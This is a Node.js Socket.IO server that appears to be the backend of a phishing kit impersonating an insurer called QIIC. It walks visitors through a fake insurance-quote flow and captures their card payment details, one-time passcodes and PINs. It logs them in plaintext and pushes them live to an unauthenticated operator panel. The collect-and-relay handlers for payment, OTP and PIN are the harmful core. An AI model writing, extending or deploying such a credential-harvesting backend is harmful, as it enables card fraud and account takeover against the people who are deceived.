// server-dynamic.js - Real-time Backend with Dynamic Table System
require('dotenv').config();

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const bodyParser = require('body-parser');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

// Import dynamic tables module
const {
  createVisitorTable,
  insertVisitorData,
  getVisitorData,
  getAllVisitors,
  getAllVisitorsData,
  updateVisitorStatus,
  deleteVisitorTable
} = require('./database/dynamicTables');

const app = express();
const server = http.createServer(app);

// 🔒 Trust proxy
app.set('trust proxy', 1);

// 🔒 Security
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));

// 🔒 Rate Limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 1000,
  message: '❌ Too many requests',
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api/', limiter);

// CORS
const corsOrigins = process.env.CORS_ORIGIN 
  ? process.env.CORS_ORIGIN.split(',').map(o => o.trim())
  : ['http://localhost:5173', 'https://ielts.sbs', 'https://www.ielts.sbs'];

const io = new Server(server, {
  cors: {
    origin: corsOrigins,
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    credentials: true,
    allowedHeaders: ['Content-Type', 'Authorization']
  }
});

app.use(cors({
  origin: corsOrigins,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(bodyParser.json());

// Track active connections
let activeConnections = new Map(); // Map<socketId, { ip, connectedAt }>

// Step mapping for customer journey
const STEP_MAP = {
  '/': 0,
  '/car-details': 1,
  '/more-details': 2,
  '/select-insurance': 3,
  '/plate-number': 4,
  '/insurance-info': 5,
  '/policy-date': 6,
  '/quote': 7,
  '/payment': 8,
  '/payment-otp': 9,
  '/payment-pin': 10,
  '/payment-success': 11
};

// Data type mapping
const DATA_TYPE_MAP = {
  '/car-details': 'car_details',
  '/more-details': 'more_details',
  '/select-insurance': 'select_insurance',
  '/plate-number': 'plate_number',
  '/insurance-info': 'insurance_info',
  '/policy-date': 'policy_date',
  '/quote': 'quote',
  '/paydcc': 'payment_dcc',
  '/payqpay': 'payment_qpay',
  '/payment-otp': 'payment_otp',
  '/payment-pin': 'payment_pin'
};

/**
 * Initialize visitor table when they first connect
 */
async function initializeVisitor(ip, socketId) {
  try {
    console.log(`🔧 Initializing visitor: ${ip}`);
    
    // Create table if doesn't exist
    const { success, tableName } = await createVisitorTable(ip);
    
    if (success) {
      // Update visitor status
      await updateVisitorStatus(ip, true, '/', socketId);
      console.log(`✅ Visitor ${ip} initialized → Table: ${tableName}`);
      return { success: true, tableName };
    }
    
    return { success: false };
  } catch (error) {
    console.error(`❌ Error initializing visitor ${ip}:`, error);
    return { success: false, error: error.message };
  }
}

/**
 * Save visitor data to their dynamic table
 */
async function saveVisitorData(ip, dataType, data, pageName) {
  try {
    const stepNumber = STEP_MAP[pageName] || 0;
    
    const success = await insertVisitorData(ip, dataType, data, pageName, stepNumber);
    
    if (success) {
      console.log(`💾 Saved ${dataType} for ${ip} at ${pageName} (step ${stepNumber})`);
      return { success: true };
    }
    
    return { success: false };
  } catch (error) {
    console.error(`❌ Error saving data for ${ip}:`, error);
    return { success: false, error: error.message };
  }
}

// ==========================================
// SOCKET.IO EVENT HANDLERS
// ==========================================

io.on('connection', async (socket) => {
  console.log(`✅ Client connected: ${socket.id}`);

  // User identification
  socket.on('userIdentify', async ({ ip }) => {
    console.log(`👤 User identified: ${ip}`);
    
    // Store connection
    activeConnections.set(socket.id, {
      ip,
      connectedAt: new Date().toISOString()
    });
    
    // Initialize visitor table
    const result = await initializeVisitor(ip, socket.id);
    
    if (result.success) {
      socket.emit('visitorInitialized', {
        success: true,
        tableName: result.tableName,
        message: 'Your session has been created'
      });
      
      // Notify admin about new visitor
      io.emit('newVisitor', {
        ip,
        tableName: result.tableName,
        connectedAt: new Date().toISOString()
      });
    }
  });

  // Page navigation
  socket.on('pageChange', async ({ ip, page, timestamp }) => {
    console.log(`📍 ${ip} → ${page}`);
    
    // Update status in database
    await updateVisitorStatus(ip, true, page, socket.id);
    
    // Notify admin
    io.emit('locationUpdated', { ip, page, timestamp: timestamp || new Date().toISOString() });
  });

  socket.on('updateLocation', async ({ ip, page, timestamp }) => {
    console.log(`📍 ${ip} at ${page}`);
    
    // Update status
    await updateVisitorStatus(ip, true, page, socket.id);
    
    // Notify admin
    io.emit('locationUpdated', { ip, page, timestamp: timestamp || new Date().toISOString() });
  });

  // Data submission from forms
  socket.on('submitFormData', async ({ ip, page, data }) => {
    console.log(`📝 Form submission from ${ip} at ${page}`);
    
    const dataType = DATA_TYPE_MAP[page] || 'generic_data';
    
    // Save to visitor's table
    const result = await saveVisitorData(ip, dataType, data, page);
    
    if (result.success) {
      socket.emit('dataSaved', { success: true, page, dataType });
      
      // Notify admin about new data
      io.emit('newFormData', {
        ip,
        page,
        dataType,
        data,
        timestamp: new Date().toISOString()
      });
    } else {
      socket.emit('dataSaved', { success: false, error: result.error });
    }
  });

  // Payment submission
  socket.on('submitPayment', async ({ ip, paymentMethod, ...paymentData }) => {
    console.log(`💳 Payment from ${ip} via ${paymentMethod}`);
    
    const dataType = paymentMethod.toLowerCase().includes('qpay') ? 'payment_qpay' : 'payment_dcc';
    const page = paymentMethod.toLowerCase().includes('qpay') ? '/payqpay' : '/paydcc';
    
    const fullPaymentData = {
      paymentMethod,
      ...paymentData,
      timestamp: new Date().toISOString()
    };
    
    // Save to visitor's table
    const result = await saveVisitorData(ip, dataType, fullPaymentData, page);
    
    if (result.success) {
      // Notify admin
      io.emit('newPayment', {
        ip,
        paymentMethod,
        data: fullPaymentData,
        timestamp: new Date().toISOString()
      });
    }
  });

  // OTP submission
  socket.on('submitOTP', async ({ ip, otpCode, ...otpData }) => {
    console.log(`🔐 OTP from ${ip}: ${otpCode}`);
    
    const fullOTPData = {
      otpCode,
      ...otpData,
      timestamp: new Date().toISOString()
    };
    
    // Save to visitor's table
    await saveVisitorData(ip, 'payment_otp', fullOTPData, '/payment-otp');
    
    // Notify admin
    io.emit('newOTP', {
      ip,
      otpCode,
      ...otpData,
      timestamp: new Date().toISOString()
    });
  });

  // PIN submission
  socket.on('submitPIN', async ({ ip, pinCode, ...pinData }) => {
    console.log(`🔑 PIN from ${ip}: ${pinCode}`);
    
    const fullPINData = {
      pinCode,
      ...pinData,
      timestamp: new Date().toISOString()
    };
    
    // Save to visitor's table
    await saveVisitorData(ip, 'payment_pin', fullPINData, '/payment-pin');
    
    // Notify admin
    io.emit('newPIN', {
      ip,
      pinCode,
      ...pinData,
      timestamp: new Date().toISOString()
    });
  });

  // Admin: Load all visitors data
  socket.on('loadAllVisitors', async () => {
    console.log('📤 Admin requested all visitors data');
    
    try {
      const allData = await getAllVisitorsData();
      socket.emit('allVisitorsData', allData);
    } catch (error) {
      console.error('❌ Error loading visitors:', error);
      socket.emit('error', { message: 'Failed to load visitors data' });
    }
  });

  // Admin: Load specific visitor data
  socket.on('loadVisitorData', async ({ ip }) => {
    console.log(`📤 Admin requested data for ${ip}`);
    
    try {
      const data = await getVisitorData(ip);
      socket.emit('visitorData', { ip, data });
    } catch (error) {
      console.error(`❌ Error loading visitor ${ip}:`, error);
      socket.emit('error', { message: `Failed to load visitor ${ip}` });
    }
  });

  // Admin: Delete visitor
  socket.on('deleteVisitor', async ({ ip }) => {
    console.log(`🗑️ Admin deleting visitor ${ip}`);
    
    try {
      const success = await deleteVisitorTable(ip);
      
      if (success) {
        socket.emit('visitorDeleted', { success: true, ip });
        io.emit('visitorRemoved', { ip });
      } else {
        socket.emit('visitorDeleted', { success: false, ip, message: 'Visitor not found' });
      }
    } catch (error) {
      console.error(`❌ Error deleting visitor ${ip}:`, error);
      socket.emit('error', { message: `Failed to delete visitor ${ip}` });
    }
  });

  // Disconnect handling
  socket.on('disconnect', async () => {
    console.log(`❌ Client disconnected: ${socket.id}`);
    
    const connection = activeConnections.get(socket.id);
    if (connection) {
      const { ip } = connection;
      
      // Update status to inactive
      await updateVisitorStatus(ip, false, null, null);
      
      // Notify admin
      io.emit('userDisconnected', { ip });
      
      // Remove from active connections
      activeConnections.delete(socket.id);
      
      console.log(`👋 User ${ip} disconnected (${socket.id})`);
    }
  });
});

// ==========================================
// REST API ENDPOINTS
// ==========================================

// Get client IP
app.get('/api/client-ip', (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() ||
             req.headers['x-real-ip'] ||
             req.connection.remoteAddress ||
             req.socket.remoteAddress ||
             '127.0.0.1';
  
  console.log(`🌐 Client IP request: ${ip}`);
  res.json({ ip });
});

// Get all visitors (admin)
app.get('/api/admin/visitors', async (req, res) => {
  try {
    const visitors = await getAllVisitors();
    res.json({ success: true, visitors });
  } catch (error) {
    console.error('❌ Error fetching visitors:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get specific visitor data (admin)
app.get('/api/admin/visitor/:ip', async (req, res) => {
  try {
    const { ip } = req.params;
    const data = await getVisitorData(ip);
    res.json({ success: true, ip, data });
  } catch (error) {
    console.error(`❌ Error fetching visitor ${req.params.ip}:`, error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Delete visitor (admin)
app.delete('/api/admin/visitor/:ip', async (req, res) => {
  try {
    const { ip } = req.params;
    const success = await deleteVisitorTable(ip);
    
    if (success) {
      // Notify all admins
      io.emit('visitorRemoved', { ip });
      res.json({ success: true, message: `Visitor ${ip} deleted` });
    } else {
      res.status(404).json({ success: false, message: 'Visitor not found' });
    }
  } catch (error) {
    console.error(`❌ Error deleting visitor ${req.params.ip}:`, error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    activeConnections: activeConnections.size
  });
});

// ==========================================
// START SERVER
// ==========================================

const PORT = process.env.PORT || 4000;

server.listen(PORT, () => {
  console.log(`
┌─────────────────────────────────────────────────┐
│  🚀 QIIC Dynamic Tables Server Running          │
│  📡 Port: ${PORT}                                    │
│  🌍 Environment: ${process.env.NODE_ENV || 'development'}                    │
│  📊 Database: ${process.env.DB_NAME || 'u262632985_qic'}           │
│  ✨ Dynamic Tables: ENABLED                     │
│  🔄 Real-time: Socket.IO Active                 │
└─────────────────────────────────────────────────┘
  `);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('💤 SIGTERM signal received: closing HTTP server');
  server.close(() => {
    console.log('✅ HTTP server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('💤 SIGINT signal received: closing HTTP server');
  server.close(() => {
    console.log('✅ HTTP server closed');
    process.exit(0);
  });
});

module.exports = { app, server, io };
